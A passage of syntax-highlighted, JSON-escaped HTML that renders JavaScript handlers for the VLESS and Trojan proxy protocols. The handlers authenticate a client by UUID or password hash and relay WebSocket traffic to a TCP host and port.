class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// VLE-SS处理\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e handleVlessConnection\u003cspan class=\"o\"\u003e(\u003c/span\u003ews, msg\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"o\"\u003e[\u003c/span\u003eVERSION\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003eid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003e1, 17\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!id.every\u003cspan class=\"o\"\u003e((\u003c/span\u003ev, i\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"nv\"\u003ev\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e parseInt\u003cspan class=\"o\"\u003e(\u003c/span\u003euuid.substr\u003cspan class=\"o\"\u003e(\u003c/span\u003ei * 2, 2\u003cspan class=\"o\"\u003e)\u003c/span\u003e, 16\u003cspan class=\"o\"\u003e)))\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e false\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003e17, 18\u003cspan class=\"o\"\u003e)\u003c/span\u003e.readUInt8\u003cspan class=\"o\"\u003e()\u003c/span\u003e + 19\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003eport\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei, \u003cspan class=\"nv\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 2\u003cspan class=\"o\"\u003e)\u003c/span\u003e.readUInt16BE\u003cspan class=\"o\"\u003e(\u003c/span\u003e0\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003eATYP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei, \u003cspan class=\"nv\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 1\u003cspan class=\"o\"\u003e)\u003c/span\u003e.readUInt8\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003ehost\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003eATYP\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e ? msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei, \u003cspan class=\"nv\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 4\u003cspan class=\"o\"\u003e)\u003c/span\u003e.join\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;.\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e :\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eATYP\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"m\"\u003e2\u003c/span\u003e ? new TextDecoder\u003cspan class=\"o\"\u003e()\u003c/span\u003e.decode\u003cspan class=\"o\"\u003e(\u003c/span\u003emsg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei + 1, \u003cspan class=\"nv\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e + msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei, i + 1\u003cspan class=\"o\"\u003e)\u003c/span\u003e.readUInt8\u003cspan class=\"o\"\u003e()))\u003c/span\u003e :\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eATYP\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"m\"\u003e3\u003c/span\u003e ? msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei, \u003cspan class=\"nv\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 16\u003cspan class=\"o\"\u003e)\u003c/span\u003e.reduce\u003cspan class=\"o\"\u003e((\u003c/span\u003es, b, i, a\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e(\u003c/span\u003ei % \u003cspan class=\"m\"\u003e2\u003c/span\u003e ? s.concat\u003cspan class=\"o\"\u003e(\u003c/span\u003ea.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei - 1, i + 1\u003cspan class=\"o\"\u003e))\u003c/span\u003e : s\u003cspan class=\"o\"\u003e)\u003c/span\u003e, \u003cspan class=\"o\"\u003e[])\u003c/span\u003e.map\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eb\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; b.readUInt16BE\u003cspan class=\"o\"\u003e(\u003c/span\u003e0\u003cspan class=\"o\"\u003e)\u003c/span\u003e.toString\u003cspan class=\"o\"\u003e(\u003c/span\u003e16\u003cspan class=\"o\"\u003e))\u003c/span\u003e.join\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e : \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ws.send\u003cspan class=\"o\"\u003e(\u003c/span\u003enew Uint8Array\u003cspan class=\"o\"\u003e([\u003c/span\u003eVERSION, 0\u003cspan class=\"o\"\u003e]))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003eduplex\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e createWebSocketStream\u003cspan class=\"o\"\u003e(\u003c/span\u003ews\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  resolveHost\u003cspan class=\"o\"\u003e(\u003c/span\u003ehost\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    .then\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eresolvedIP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      net.connect\u003cspan class=\"o\"\u003e({\u003c/span\u003e host: resolvedIP, port \u003cspan class=\"o\"\u003e}\u003c/span\u003e, \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        this.write\u003cspan class=\"o\"\u003e(\u003c/span\u003emsg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        duplex.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003ethis\u003cspan class=\"o\"\u003e)\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003eduplex\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e})\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e})\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    .catch\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      net.connect\u003cspan class=\"o\"\u003e({\u003c/span\u003e host, port \u003cspan class=\"o\"\u003e}\u003c/span\u003e, \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        this.write\u003cspan class=\"o\"\u003e(\u003c/span\u003emsg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        duplex.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003ethis\u003cspan class=\"o\"\u003e)\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003eduplex\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e})\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e true\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// Tro-jan处理\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efunction\u003c/span\u003e handleTrojanConnection\u003cspan class=\"o\"\u003e(\u003c/span\u003ews, msg\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  try \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003emsg.length \u0026lt; 58\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e false\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003ereceivedPasswordHash\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, 56\u003cspan class=\"o\"\u003e)\u003c/span\u003e.toString\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003epossiblePasswords\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      UUID,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003ematchedPassword\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e null\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003econst \u003cspan class=\"nb\"\u003epwd\u003c/span\u003e of possiblePasswords\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nb\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e crypto.createHash\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;sha224\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e.update\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e.digest\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hex\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ehash\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e receivedPasswordHash\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ematchedPassword\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e pwd\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!matchedPassword\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e false\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elet\u003c/span\u003e \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 56\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003emsg\u003cspan class=\"o\"\u003e[\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0x0d \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e msg\u003cspan class=\"o\"\u003e[\u003c/span\u003eoffset + 1\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0x0a\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 2\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003ecmd\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg\u003cspan class=\"o\"\u003e[\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ecmd !\u003cspan class=\"o\"\u003e==\u003c/span\u003e 0x01\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e false\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 1\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003eatyp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg\u003cspan class=\"o\"\u003e[\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 1\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elet\u003c/span\u003e host, port\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eatyp\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0x01\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003ehost\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset, offset + 4\u003cspan class=\"o\"\u003e)\u003c/span\u003e.join\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;.\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 4\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eatyp\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0x03\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003ehostLen\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg\u003cspan class=\"o\"\u003e[\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 1\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003ehost\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset, offset + hostLen\u003cspan class=\"o\"\u003e)\u003c/span\u003e.toString\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e hostLen\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eatyp\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0x04\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003ehost\u003c/span\u003e \u003cspan 